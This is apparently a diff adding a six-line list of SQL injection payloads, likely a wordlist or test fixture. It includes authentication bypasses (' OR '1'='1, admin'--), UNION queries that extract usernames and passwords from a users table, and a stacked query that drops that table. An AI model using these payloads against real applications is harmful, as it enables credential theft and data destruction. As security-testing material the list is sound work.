@@ -1,0 +1,6 @@
+union select * from users
+' OR '1'='1
+'; DROP TABLE users;--
+admin'--
+1 UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,username,password FROM users--
